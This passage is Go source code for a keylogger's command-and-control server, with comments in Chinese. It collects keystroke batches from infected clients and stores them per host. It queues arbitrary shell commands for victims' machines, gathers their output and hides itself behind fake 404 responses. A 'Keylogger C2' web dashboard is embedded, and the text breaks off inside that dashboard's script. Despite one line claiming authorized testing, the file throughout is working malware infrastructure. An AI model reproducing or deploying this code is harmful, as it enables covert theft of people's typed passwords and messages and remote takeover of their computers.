// C2 服务端:接收键盘记录客户端上报的数据。
// 仅用于经授权的测试环境。
//
// 运行:
//
//	go run ./server            # 默认监听 :8080,数据落盘 ./data
//	go run ./server -addr :8443 -dir /tmp/c2data
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
	"unicode/utf8"

	"golin/c2config"
)

var (
	addr   = flag.String("addr", ":8080", "监听地址")
	dir    = flag.String("dir", "./data", "数据落盘目录")
	online = flag.Duration("online", 60*time.Second, "客户端在线判定窗口:距上次心跳/上报超过该时长判为离线")
)

// safeName 将 client_id 转换为安全的文件名
var safeNameRe = regexp.MustCompile(`[^A-Za-z0-9._-]`)

func safeName(s string) string { return safeNameRe.ReplaceAllString(s, "_") }

// ---- 客户端在线注册表与任务队列 ----

// clientState 单个客户端的在线状态与任务队列(内存态,重启后随心跳/上报重建)
type clientState struct {
	LastSeen      time.Time
	LastReport    time.Time
	LastHeartbeat time.Time
	Tasks         []*c2config.Task
}

var (
	regMu    sync.Mutex
	registry = map[string]*clientState{}
)

// getState 返回(必要时创建)指定客户端的注册表项,调用方需持有 regMu
func getStateLocked(id string) *clientState {
	st := registry[id]
	if st == nil {
		st = &clientState{}
		registry[id] = st
	}
	return st
}

// touch 记录一次客户端接触(心跳/上报),刷新在线判定基准
func touch(id, kind string) {
	now := time.Now()
	regMu.Lock()
	defer regMu.Unlock()
	st := getStateLocked(id)
	st.LastSeen = now
	switch kind {
	case "heartbeat":
		st.LastHeartbeat = now
	case "report":
		st.LastReport = now
	}
}

// isOnline 判断客户端是否在线:距最近一次接触未超过在线窗口
func isOnline(st *clientState) bool {
	return !st.LastSeen.IsZero() && time.Since(st.LastSeen) <= *online
}

// newTaskID 生成任务 ID:时间戳 + 4 字节随机 hex
func newTaskID() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%d-%s", time.Now().UnixNano(), hex.EncodeToString(b))
}

// ---- 任务持久化 ----

// tasksFileName 任务队列的落盘文件名(位于数据目录下)
const tasksFileName = "tasks.json"

// maxTasksPerClient 每个客户端保留的最大任务数,超出时丢弃最旧任务(优先已完成)
var maxTasksPerClient = 200

// staleSentAfter 已下发任务超过该时长未回传结果即视为丢失,
// 客户端下次轮询时自动重投(至少一次语义)。
// 必须大于客户端单任务最长执行时间(60s),否则执行中的任务会被重复下发
var staleSentAfter = 90 * time.Second

func tasksFilePath() string { return filepath.Join(*dir, tasksFileName) }

// saveTasksLocked 将所有客户端任务原子写入磁盘(临时文件 + 重命名),调用方需持有 regMu
func saveTasksLocked() {
	all := []*c2config.Task{}
	for _, st := range registry {
		all = append(all, st.Tasks...)
	}
	data, err := json.MarshalIndent(all, "", "  ")
	if err != nil {
		return
	}
	tmp := tasksFilePath() + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		fmt.Printf("[-] 任务持久化失败: %v\n", err)
		return
	}
	if err := os.Rename(tmp, tasksFilePath()); err != nil {
		fmt.Printf("[-] 任务持久化失败: %v\n", err)
	}
}

// loadTasks 启动时从磁盘恢复任务队列;文件缺失或损坏时静默降级为空队列
func loadTasks() {
	data, err := os.ReadFile(tasksFilePath())
	if err != nil {
		if !os.IsNotExist(err) {
			fmt.Printf("[-] 读取任务文件失败: %v\n", err)
		}
		return
	}
	var tasks []*c2config.Task
	if err := json.Unmarshal(data, &tasks); err != nil {
		fmt.Printf("[-] 任务文件损坏,已忽略: %v\n", err)
		return
	}
	regMu.Lock()
	defer regMu.Unlock()
	n := 0
	for _, t := range tasks {
		if t == nil || t.ID == "" || t.ClientID == "" {
			continue
		}
		st := getStateLocked(t.ClientID)
		st.Tasks = append(st.Tasks, t)
		n++
	}
	if n > 0 {
		fmt.Printf("[*] 已恢复 %d 条任务\n", n)
	}
}

// trimTasksLocked 超出上限时丢弃最旧任务(优先丢弃已完成),调用方需持有 regMu
func trimTasksLocked(st *clientState) {
	for len(st.Tasks) > maxTasksPerClient {
		idx := -1
		for i, t := range st.Tasks {
			if t.Status == c2config.TaskDone {
				idx = i
				break
			}
		}
		if idx < 0 {
			idx = 0
		}
		st.Tasks = append(st.Tasks[:idx], st.Tasks[idx+1:]...)
	}
}

// ---- 强制下线名单 ----

// offlineFileName 强制下线主机名单的落盘文件名(位于数据目录下),
// 重启后仍生效:名单内主机无论心跳与否,面板一律显示离线
const offlineFileName = "offline.json"

var (
	offlineMu     sync.Mutex
	forcedOffline = map[string]bool{} // client_id -> 是否强制下线
)

func offlineFilePath() string { return filepath.Join(*dir, offlineFileName) }

// saveOfflineLocked 原子落盘下线名单(临时文件 + 重命名),调用方需持有 offlineMu
func saveOfflineLocked() {
	ids := make([]string, 0, len(forcedOffline))
	for id := range forcedOffline {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	data, err := json.MarshalIndent(ids, "", "  ")
	if err != nil {
		return
	}
	tmp := offlineFilePath() + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		fmt.Printf("[-] 下线名单持久化失败: %v\n", err)
		return
	}
	if err := os.Rename(tmp, offlineFilePath()); err != nil {
		fmt.Printf("[-] 下线名单持久化失败: %v\n", err)
	}
}

// loadOffline 启动时从磁盘恢复下线名单;文件缺失或损坏时静默降级为空名单
func loadOffline() {
	data, err := os.ReadFile(offlineFilePath())
	if err != nil {
		if !os.IsNotExist(err) {
			fmt.Printf("[-] 读取下线名单失败: %v\n", err)
		}
		return
	}
	var ids []string
	if err := json.Unmarshal(data, &ids); err != nil {
		fmt.Printf("[-] 下线名单文件损坏,已忽略: %v\n", err)
		return
	}
	offlineMu.Lock()
	defer offlineMu.Unlock()
	for _, id := range ids {
		if id != "" {
			forcedOffline[id] = true
		}
	}
	if len(ids) > 0 {
		fmt.Printf("[*] 已恢复 %d 台强制下线主机\n", len(ids))
	}
}

// isForcedOffline 主机是否在强制下线名单中
func isForcedOffline(id string) bool {
	offlineMu.Lock()
	defer offlineMu.Unlock()
	return forcedOffline[id]
}

func main() {
	initConsoleUTF8() // Windows 控制台切 UTF-8,保证终端中文日志正常显示
	flag.Parse()
	if err := os.MkdirAll(*dir, 0777); err != nil {
		fmt.Printf("[-] 创建数据目录失败: %v\n", err)
		os.Exit(1)
	}
	loadTasks()   // 恢复上次运行遗留的任务队列
	loadOffline() // 恢复上次运行遗留的强制下线名单

	http.HandleFunc(c2config.ReportPath, handleReport)
	http.HandleFunc(c2config.HealthPath, handleHealth)
	http.HandleFunc(c2config.TasksPath, handleTasks)
	http.HandleFunc(c2config.ResultPath, handleResult)
	http.HandleFunc("/api/login", handleLogin)
	http.HandleFunc("/api/clients", handleClients)
	http.HandleFunc("/api/logs", handleLogs)
	http.HandleFunc("/api/dispatch", handleDispatch)
	http.HandleFunc("/", handleUI)

	fmt.Printf("[*] C2 服务已启动: http://%s  数据目录: %s\n", *addr, *dir)
	srv := &http.Server{
		Addr:              *addr,
		ReadHeaderTimeout: 10 * time.Second, // 防慢速头攻击耗尽连接
		ReadTimeout:       30 * time.Second,
		IdleTimeout:       120 * time.Second,
	}
	if err := srv.ListenAndServe(); err != nil {
		fmt.Printf("[-] 启动失败: %v\n", err)
		os.Exit(1)
	}
}

// checkToken 校验上报接口的鉴权头
func checkToken(h string) bool { return h == c2config.Token }

// uiAuthed 校验查看页面的 cookie 会话
func uiAuthed(r *http.Request) bool {
	c, err := r.Cookie("c2session")
	return err == nil && c.Value == c2config.Token
}

// handleReport 接收按键批次,按 client_id 追加写入日志文件
func handleReport(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || !checkToken(r.Header.Get(c2config.HeaderName)) {
		http.NotFound(w, r) // 鉴权失败伪装 404
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var b c2config.Batch
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if b.ClientID == "" || len(b.Events) == 0 {
		http.Error(w, "empty batch", http.StatusBadRequest)
		return
	}

	f, err := os.OpenFile(filepath.Join(*dir, safeName(b.ClientID)+".log"),
		os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		http.Error(w, "write error", http.StatusInternalServerError)
		return
	}
	defer func() { _ = f.Close() }()
	for _, ev := range b.Events {
		_, _ = fmt.Fprintf(f, "%s [%s] [%s] %s\n",
			time.Unix(ev.Time, 0).Format("2006-01-02 15:04:05"), ev.Type, ev.Win, ev.Data)
	}

	fmt.Printf("[*] %s: +%d 条事件\n", b.ClientID, len(b.Events))
	touch(b.ClientID, "report")
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// handleHealth 心跳/测活:客户端 POST {"client_id": "..."} 刷新在线状态,
// 也兼容无 body 的简单 GET 探活
func handleHealth(w http.ResponseWriter, r *http.Request) {
	if !checkToken(r.Header.Get(c2config.HeaderName)) {
		http.NotFound(w, r)
		return
	}
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, 4096)
		var hb c2config.Heartbeat
		if json.NewDecoder(r.Body).Decode(&hb) == nil && hb.ClientID != "" {
			touch(hb.ClientID, "heartbeat")
		}
	}
	_, _ = fmt.Fprintf(w, `{"status":"ok","time":"%s"}`, time.Now().Format("2006-01-02 15:04:05"))
}

// handleLogin 查看页面登录,校验后种 cookie
func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}
	if r.FormValue("token") != c2config.Token {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
	http.SetCookie(w, &http.Cookie{Name: "c2session", Value: c2config.Token, Path: "/", HttpOnly: true})
	http.Redirect(w, r, "/", http.StatusFound)
}

// handleUI 首页:未登录返回登录页,已登录返回查看页面
func handleUI(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	if !uiAuthed(r) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = io.WriteString(w, loginHTML)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = io.WriteString(w, dashHTML)
}

// handleClients 会话列表:合并在线注册表与数据目录下的日志文件;
// POST 形态为控制台主机管理(强制下线/恢复上线/删除),见 handleClientsAction
func handleClients(w http.ResponseWriter, r *http.Request) {
	if !uiAuthed(r) {
		http.NotFound(w, r)
		return
	}
	if r.Method == http.MethodPost {
		handleClientsAction(w, r)
		return
	}
	if r.Method != http.MethodGet {
		http.NotFound(w, r)
		return
	}
	type clientInfo struct {
		ID            string `json:"id"`
		Status        string `json:"status"`           // online / offline
		Forced        bool   `json:"forced,omitempty"` // 是否被强制下线
		LastSeen      string `json:"last_seen"`
		LastHeartbeat string `json:"last_heartbeat,omitempty"`
		Events        int    `json:"events"`
		PendingTasks  int    `json:"pending_tasks"`
	}

	// 日志文件名是 safeName(client_id),去重必须以文件名形态为键,
	// 否则含特殊字符的 id 会在注册表与日志文件两处各出现一次
	seen := map[string]bool{}  // safeName -> 已收录
	bySafe := map[string]int{} // safeName -> list 下标
	list := []clientInfo{}

	regMu.Lock()
	// 先输出注册表中的客户端(有最近心跳/上报,信息最全)
	for id, st := range registry {
		info := clientInfo{ID: id, Status: "offline", Forced: isForcedOffline(id)}
		if !info.Forced && isOnline(st) {
			info.Status = "online"
		}
		if !st.LastSeen.IsZero() {
			info.LastSeen = st.LastSeen.Format("2006-01-02 15:04:05")
		}
		if !st.LastHeartbeat.IsZero() {
			info.LastHeartbeat = st.LastHeartbeat.Format("2006-01-02 15:04:05")
		}
		for _, t := range st.Tasks {
			if t.Status == c2config.TaskPending {
				info.PendingTasks++
			}
		}
		safe := safeName(id)
		seen[safe] = true
		bySafe[safe] = len(list)
		list = append(list, info)
	}
	regMu.Unlock()

	// 再扫日志文件:已在注册表的补事件数,不在的作为离线老主机收录
	entries, err := os.ReadDir(*dir)
	if err != nil {
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".log") {
			continue
		}
		fid := strings.TrimSuffix(e.Name(), ".log")
		events := 0
		if data, err := os.ReadFile(filepath.Join(*dir, e.Name())); err == nil {
			events = strings.Count(string(data), "\n")
		}
		if seen[fid] {
			list[bySafe[fid]].Events = events // 补充事件数,不重复收录
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		list = append(list, clientInfo{
			ID:       fid,
			Status:   "offline",
			Forced:   isForcedOffline(fid),
			LastSeen: info.ModTime().Format("2006-01-02 15:04:05"),
			Events:   events,
		})
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	_ = json.NewEncoder(w).Encode(list)
}

// handleClientsAction 控制台主机管理:
//   - POST {"id","action":"offline"} 强制下线:状态锁定为离线(持久化,重启仍生效),
//     数据上报与任务下发不受影响,便于继续观察或下发卸载命令
//   - POST {"id","action":"online"}  取消强制下线,恢复自然在线判定
//   - POST {"id","action":"delete"}  删除主机:清除注册表状态、全部任务与日志文件
func handleClientsAction(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 4096)
	var req struct {
		ID     string `json:"id"`
		Action string `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.ID == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	switch req.Action {
	case "offline":
		offlineMu.Lock()
		forcedOffline[req.ID] = true
		saveOfflineLocked()
		offlineMu.Unlock()
		fmt.Printf("[*] 主机强制下线: %s\n", req.ID)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
		return

	case "online":
		offlineMu.Lock()
		was := forcedOffline[req.ID]
		delete(forcedOffline, req.ID)
		if was {
			saveOfflineLocked()
		}
		offlineMu.Unlock()
		fmt.Printf("[*] 主机恢复上线: %s\n", req.ID)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
		return

	case "delete":
		removed := false
		regMu.Lock()
		if _, ok := registry[req.ID]; ok {
			delete(registry, req.ID)
			saveTasksLocked() // 持久化任务移除,重启后不会恢复
			removed = true
		}
		regMu.Unlock()
		offlineMu.Lock()
		if forcedOffline[req.ID] {
			delete(forcedOffline, req.ID)
			saveOfflineLocked()
		}
		offlineMu.Unlock()
		logPath := filepath.Join(*dir, safeName(req.ID)+".log")
		if err := os.Remove(logPath); err == nil {
			removed = true
		} else if !os.IsNotExist(err) {
			http.Error(w, "delete log failed", http.StatusInternalServerError)
			return
		}
		if !removed {
			http.NotFound(w, r)
			return
		}
		fmt.Printf("[*] 主机已删除: %s (状态/任务/日志)\n", req.ID)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
		return
	}
	http.Error(w, "unknown action", http.StatusBadRequest)
}

// handleLogs 返回指定主机的日志尾部(最多 64KB)
func handleLogs(w http.ResponseWriter, r *http.Request) {
	if !uiAuthed(r) {
		http.NotFound(w, r)
		return
	}
	client := r.URL.Query().Get("client")
	if client == "" {
		http.NotFound(w, r)
		return
	}
	f, err := os.Open(filepath.Join(*dir, safeName(client)+".log"))
	if err != nil {
		http.NotFound(w, r)
		return
	}
	defer func() { _ = f.Close() }()
	st, err := f.Stat()
	if err != nil {
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}
	off := int64(0)
	if st.Size() > 64*1024 {
		off = st.Size() - 64*1024
	}
	_, _ = f.Seek(off, 0)
	data, _ := io.ReadAll(f)
	// 跳过首个不完整的行
	if off > 0 {
		if i := strings.IndexByte(string(data), '\n'); i >= 0 {
			data = data[i+1:]
		}
	}
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	_, _ = w.Write(data)
}

// ---- 命令下发记录(控制台全局面板) ----

// dispatchItem 命令下发记录条目
type dispatchItem struct {
	ID        string `json:"id"`
	ClientID  string `json:"client_id"`
	Command   string `json:"command"`
	Status    string `json:"status"` // pending / sent / done
	Result    string `json:"result,omitempty"`
	Error     string `json:"error,omitempty"`
	CreatedAt int64  `json:"created_at"`
	DoneAt    int64  `json:"done_at,omitempty"`
	Truncated bool   `json:"truncated,omitempty"`
}

const (
	dispatchMaxItems  = 100  // 面板最多展示的记录数
	dispatchResultMax = 2048 // 单条结果摘要最大字节数(完整结果见单主机任务面板)
)

// truncateRunes 按 rune 边界截断字符串,避免切断 UTF-8 多字节字符
func truncateRunes(s string, max int) (string, bool) {
	if len(s) <= max {
		return s, false
	}
	cut := max
	for cut > 0 && !utf8.RuneStart(s[cut]) {
		cut--
	}
	return s[:cut], true
}

// handleDispatch 返回全部客户端的近期命令下发记录(按创建时间倒序),
// 供控制台首页的"命令下发"面板集中展示
func handleDispatch(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet || !uiAuthed(r) {
		http.NotFound(w, r)
		return
	}
	regMu.Lock()
	items := make([]dispatchItem, 0)
	for id, st := range registry {
		for _, t := range st.Tasks {
			res, trunc := truncateRunes(t.Result, dispatchResultMax)
			items = append(items, dispatchItem{
				ID:        t.ID,
				ClientID:  id,
				Command:   t.Command,
				Status:    t.Status,
				Result:    res,
				Error:     t.Error,
				CreatedAt: t.CreatedAt,
				DoneAt:    t.DoneAt,
				Truncated: trunc,
			})
		}
	}
	regMu.Unlock()
	sort.Slice(items, func(i, j int) bool {
		if items[i].CreatedAt != items[j].CreatedAt {
			return items[i].CreatedAt > items[j].CreatedAt
		}
		return items[i].ID > items[j].ID // ID 内含纳秒时间戳,同秒内保持倒序
	})
	if len(items) > dispatchMaxItems {
		items = items[:dispatchMaxItems]
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	_ = json.NewEncoder(w).Encode(items)
}

// ---- 命令下发 / 任务管理 ----

// handleTasks 同一路径双用途:带 token 头的是客户端拉取任务,带会话 cookie 的是控制台管理
func handleTasks(w http.ResponseWriter, r *http.Request) {
	if checkToken(r.Header.Get(c2config.HeaderName)) {
		handleTasksClient(w, r)
		return
	}
	if !uiAuthed(r) {
		http.NotFound(w, r)
		return
	}
	handleTasksUI(w, r)
}

// handleTasksClient 客户端轮询:返回该客户端所有 pending 任务并标记为 sent;
// 已下发但超时未回传结果的任务(客户端取走后崩溃/结果丢失)自动重投
func handleTasksClient(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.NotFound(w, r)
		return
	}
	client := r.URL.Query().Get("client")
	if client == "" {
		http.NotFound(w, r)
		return
	}
	touch(client, "heartbeat") // 拉任务同样证明客户端存活
	regMu.Lock()
	st := getStateLocked(client)
	out := []*c2config.Task{}
	now := time.Now().Unix()
	staleSec := int64(staleSentAfter.Seconds())
	for _, t := range st.Tasks {
		switch {
		case t.Status == c2config.TaskPending:
			t.Status = c2config.TaskSent
			t.SentAt = now
			out = append(out, t)
		case t.Status == c2config.TaskSent && now-t.SentAt > staleSec:
			// 超时未回传(含旧版无 SentAt 的历史任务),重投
			t.SentAt = now
			out = append(out, t)
		}
	}
	if len(out) > 0 {
		saveTasksLocked() // 持久化 sent 状态,重启后不重复下发
	}
	regMu.Unlock()
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	_ = json.NewEncoder(w).Encode(out)
}

// handleTasksUI 控制台任务管理:
//   - GET  ?client=xx           列出该客户端全部任务(倒序)
//   - POST {"client_id","command"} 下发新任务
//   - POST {"id","action":"requeue"} 将已下发/未回传任务重置为待执行
//   - POST {"id","action":"delete"}  删除任务
func handleTasksUI(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		client := r.URL.Query().Get("client")
		if client == "" {
			http.NotFound(w, r)
			return
		}
		regMu.Lock()
		st := registry[client]
		var tasks []*c2config.Task
		if st != nil {
			// 倒序:最新任务在前
			tasks = make([]*c2config.Task, 0, len(st.Tasks))
			for i := len(st.Tasks) - 1; i >= 0; i-- {
				tasks = append(tasks, st.Tasks[i])
			}
		}
		regMu.Unlock()
		if tasks == nil {
			tasks = []*c2config.Task{}
		}
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		_ = json.NewEncoder(w).Encode(tasks)

	case http.MethodPost:
		r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
		var req struct {
			ClientID string `json:"client_id"`
			Command  string `json:"command"`
			ID       string `json:"id"`
			Action   string `json:"action"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if req.ID != "" {
			switch req.Action {
			case "requeue":
				ok := false
				regMu.Lock()
				for _, st := range registry {
					for _, t := range st.Tasks {
						if t.ID == req.ID && t.Status != c2config.TaskDone {
							t.Status = c2config.TaskPending
							ok = true
						}
					}
				}
				if ok {
					saveTasksLocked()
				}
				regMu.Unlock()
				if !ok {
					http.NotFound(w, r)
					return
				}
				_, _ = w.Write([]byte(`{"status":"ok"}`))
				return
			case "delete":
				ok := false
				regMu.Lock()
				for _, st := range registry {
					for i, t := range st.Tasks {
						if t.ID == req.ID {
							st.Tasks = append(st.Tasks[:i], st.Tasks[i+1:]...)
							ok = true
							break
						}
					}
				}
				if ok {
					saveTasksLocked()
				}
				regMu.Unlock()
				if !ok {
					http.NotFound(w, r)
					return
				}
				_, _ = w.Write([]byte(`{"status":"ok"}`))
				return
			}
		}
		// 下发新任务
		if req.ClientID == "" || strings.TrimSpace(req.Command) == "" {
			http.Error(w, "client_id and command required", http.StatusBadRequest)
			return
		}
		task := &c2config.Task{
			ID:        newTaskID(),
			ClientID:  req.ClientID,
			Command:   strings.TrimSpace(req.Command),
			Status:    c2config.TaskPending,
			CreatedAt: time.Now().Unix(),
		}
		regMu.Lock()
		st := getStateLocked(req.ClientID)
		st.Tasks = append(st.Tasks, task)
		trimTasksLocked(st)
		saveTasksLocked()
		regMu.Unlock()
		fmt.Printf("[*] 任务下发 -> %s: %s\n", req.ClientID, task.Command)
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		_ = json.NewEncoder(w).Encode(task)

	default:
		http.NotFound(w, r)
	}
}

// handleResult 客户端回传任务执行结果,任务状态 sent -> done
func handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || !checkToken(r.Header.Get(c2config.HeaderName)) {
		http.NotFound(w, r)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var res c2config.TaskResult
	if err := json.NewDecoder(r.Body).Decode(&res); err != nil || res.ID == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	touch(res.ClientID, "heartbeat")
	regMu.Lock()
	defer regMu.Unlock()
	st := getStateLocked(res.ClientID)
	for _, t := range st.Tasks {
		if t.ID == res.ID && t.Status != c2config.TaskDone {
			t.Status = c2config.TaskDone
			t.Result = res.Output
			t.Error = res.Error
			t.DoneAt = time.Now().Unix()
			saveTasksLocked() // 持久化执行结果
			fmt.Printf("[*] 任务结果 <- %s: %s (%s)\n", res.ClientID, t.Command, taskBrief(res))
			break
		}
	}
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// taskBrief 结果日志摘要,单行
func taskBrief(res c2config.TaskResult) string {
	if res.Error != "" {
		return "error: " + res.Error
	}
	return fmt.Sprintf("output %d bytes", len(res.Output))
}

const loginHTML = `<!DOCTYPE html>
<html lang="zh"><head><meta charset="utf-8"><title>C2 登录</title>
<style>
body{background:#0f1115;color:#e6e6e6;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
form{background:#171a21;padding:36px;border-radius:10px;border:1px solid #2a2f3a}
input{padding:9px 14px;border-radius:6px;border:1px solid #3a4150;background:#0f1115;color:#e6e6e6;font-size:14px;outline:none}
input:focus{border-color:#2e7d32}
button{margin-left:10px;padding:9px 18px;border-radius:6px;border:none;background:#2e7d32;color:#fff;cursor:pointer;font-size:14px}
button:hover{background:#388e3c}
</style></head>
<body><form method="post" action="/api/login">
<input type="password" name="token" placeholder="访问口令" autofocus>
<button type="submit">登录</button>
</form></body></html>
`

const dashHTML = `<!DOCTYPE html>
<html lang="zh"><head><meta charset="utf-8"><title>Keylogger C2</title>
<style>
body{background:#0f1115;color:#e6e6e6;font-family:system-ui,sans-serif;margin:0;padding:24px}
h1{font-size:20px;margin:0 0 18px}
h2{font-size:15px;margin:0 0 10px;color:#9ad29b}
table{border-collapse:collapse;width:100%;max-width:1000px}
th,td{text-align:left;padding:8px 12px;border-bottom:1px solid #232836;font-size:13px}
th{color:#9aa3b2;font-weight:500}
a{color:#6cb6ff;text-decoration:none}
a:hover{text-decoration:underline}
pre{background:#0a0c10;border:1px solid #232836;border-radius:8px;padding:14px;max-height:50vh;overflow:auto;font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all}
pre.result{margin:4px 0 0;max-height:220px;font-size:12px}
.pager{margin-top:6px;display:flex;align-items:center;gap:6px}
.pager .mini{margin-right:0;padding:2px 8px;font-size:11px}
.pager .mini:disabled{opacity:.4;cursor:default}
.pagerinfo{color:#9aa3b2;font-size:12px;margin:0 4px}
#logwrap,#taskwrap{margin-top:26px}
.on{color:#4caf50;font-weight:600}
.off{color:#8a93a5}
.forced{color:#e8a13c;font-weight:600}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:12px}
.badge.pending{background:#2a3350;color:#8fb0ff}
.badge.sent{background:#4a3d1f;color:#e8c15a}
.badge.done{background:#1f3a26;color:#6fcf8a}
input[type=text]{padding:9px 14px;border-radius:6px;border:1px solid #3a4150;background:#0f1115;color:#e6e6e6;font-size:14px;outline:none;width:460px;max-width:70%}
input:focus{border-color:#2e7d32}
button{padding:8px 14px;border-radius:6px;border:none;background:#2e7d32;color:#fff;cursor:pointer;font-size:13px}
button:hover{background:#388e3c}
button.mini{padding:3px 10px;font-size:12px;margin-right:6px;background:#333c4d}
button.mini.del{background:#5c2f33}
</style></head>
<body>
<h1>Keylogger C2 控制台</h1>
<table><tr><th>状态</th><th>主机</th><th>最后心跳</th><th>待执行</th><th>事件数</th><th>操作</th></tr>
<tbody id="rows"><tr><td colspan="6" style="color:#9aa3b2">暂无数据</td></tr></tbody></table>

<div id="dispatchwrap" style="margin-top:26px">
<h2>命令下发</h2>
<table><tr><th>时间</th><th>主机</th><th>状态</th><th>命令</th><th>结果</th></tr>
<tbody id="dispatchrows"><tr><td colspan="5" style="color:#9aa3b2">暂无下发记录</td></tr></tbody></table>
</div>

<div id="taskwrap" style="display:none">
<h2 id="tasktitle"></h2>
<input type="text" id="cmd" placeholder="输入要下发的命令,例如 whoami /all">
<button onclick="sendCmd()">下发</button>
<table style="margin-top:16px"><tr><th>时间</th><th>状态</th><th>命令</th><th>结果</th><th>操作</th></tr>
<tbody id="taskrows"><tr><td colspan="5" style="color:#9aa3b2">暂无任务</td></tr></tbody></table>
</div>

<div id="logwrap" style="display:none">
<h2 id="logtitle"></h2>
<pre id="log"></pre>
</div>
<script>
const cur = new URLSearchParams(location.search).get('c');

function refreshClients(){
  fetch('/api/clients').then(r=>r.json()).then(list=>{
    const rows = document.getElementById('rows');
    if (!list.length) return;
    rows.innerHTML = '';
    list.forEach(s=>{
      const tr = document.createElement('tr');
      const on = s.status === 'online';
      const td0 = document.createElement('td');
      if (s.forced) {
        td0.innerHTML = '<span class="forced">◐ 已下线</span>';
      } else {
        td0.innerHTML = on ? '<span class="on">● 在线</span>' : '<span class="off">○ 离线</span>';
      }
      const a = document.createElement('a');
      a.href = '/?c=' + encodeURIComponent(s.id);
      a.textContent = s.id;
      const td1 = document.createElement('td'); td1.appendChild(a);
      const td2 = document.createElement('td'); td2.textContent = s.last_heartbeat || s.last_seen || '-';
      const td3 = document.createElement('td'); td3.textContent = s.pending_tasks || 0;
      const td4 = document.createElement('td'); td4.textContent = s.events;
      const td5 = document.createElement('td');
      const off = document.createElement('button');
      off.className = 'mini';
      if (s.forced) {
        off.textContent = '恢复上线';
        off.onclick = () => hostAction(s.id, 'online');
      } else {
        off.textContent = '下线';
        off.onclick = () => hostAction(s.id, 'offline');
      }
      const del = document.createElement('button');
      del.className = 'mini del'; del.textContent = '删除';
      del.onclick = () => {
        if (confirm('确认删除主机 ' + s.id + ' ?\n将同时删除其任务与日志文件,不可恢复')) {
          hostAction(s.id, 'delete');
        }
      };
      td5.append(off, del);
      tr.append(td0, td1, td2, td3, td4, td5);
      rows.appendChild(tr);
    });
  });
}

function hostAction(id, action){
  fetch('/api/clients', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({id: id, action: action})
  }).then(r=>{
    if (r.ok) { refreshClients(); return; }
    if (r.status === 404) { alert('主机不存在,可能已删除'); refreshClients(); return; }
    alert('操作失败 (' + r.status + ')');
  });
}
refreshClients();
setInterval(refreshClients, 5000);

function refreshDispatch(){
  fetch('/api/dispatch').then(r=>r.json()).then(list=>{
    const rows = document.getElementById('dispatchrows');
    rows.innerHTML = '';
    if (!list || !list.length) {
      rows.innerHTML = '<tr><td colspan="5" style="color:#9aa3b2">暂无下发记录</td></tr>';
      return;
    }
    list.forEach(d=>{
      const tr = document.createElement('tr');
      const td0 = document.createElement('td');
      td0.textContent = new Date(d.created_at*1000).toLocaleString();
      const a = document.createElement('a');
      a.href = '/?c=' + encodeURIComponent(d.client_id);
      a.textContent = d.client_id;
      const td1 = document.createElement('td'); td1.appendChild(a);
      const td2 = document.createElement('td'); td2.appendChild(badge(d.status));
      const td3 = document.createElement('td'); td3.textContent = d.command;
      const td4 = document.createElement('td');
      if (d.status === 'done') {
        let out = (d.result || '') + (d.error ? '\n[错误] ' + d.error : '');
        if (d.truncated) out += '\n…(结果已截断,点击主机查看完整)';
        renderResult(td4, out);
      } else if (d.status === 'sent') {
        td4.textContent = '执行中…';
      }
      tr.append(td0, td1, td2, td3, td4);
      rows.appendChild(tr);
    });
  });
}
